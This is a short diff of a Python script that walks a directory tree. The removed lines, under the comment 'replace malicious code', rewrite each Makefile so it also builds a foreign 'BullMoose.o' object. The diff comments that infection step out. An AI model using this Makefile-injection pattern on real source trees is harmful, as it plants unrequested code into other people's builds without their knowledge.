@@ -48,15 +48,15 @@ for parent, dirnames, filenames in os.walk(rootdir):
             #             os.path.join(parent, filename))
 
             # replace malicious code
-            infile = open(os.path.join(parent, filename), "r")
-            outfile = open(os.path.join(parent, "temp_makefile"), "w")
-            lines = infile.readlines()
-            for line in lines:
-                    outfile.write(line.replace(
-                        "OBJS =", "OBJS = BullMoose.o"))
-            outfile.write("BullMoose.c: BullMoose.h")
-            infile.close()
-            outfile.close()
-            os.remove(os.path.join(parent, filename))
-            shutil.move(os.path.join(parent, "temp_makefile"),
-                        os.path.join(parent, filename))
+            # infile = open(os.path.join(parent, filename), "r")
+            # outfile = open(os.path.join(parent, "temp_makefile"), "w")
+            # lines = infile.readlines()
+            # for line in lines:
+            #         outfile.write(line.replace(
+            #             "OBJS =", "OBJS = bullmoose.o"))
+            # outfile.write("bullmoose.c: bullmoose.h")
+            # infile.close()
+            # outfile.close()
+            # os.remove(os.path.join(parent, filename))
+            # shutil.move(os.path.join(parent, "temp_makefile"),
+            #             os.path.join(parent, filename))
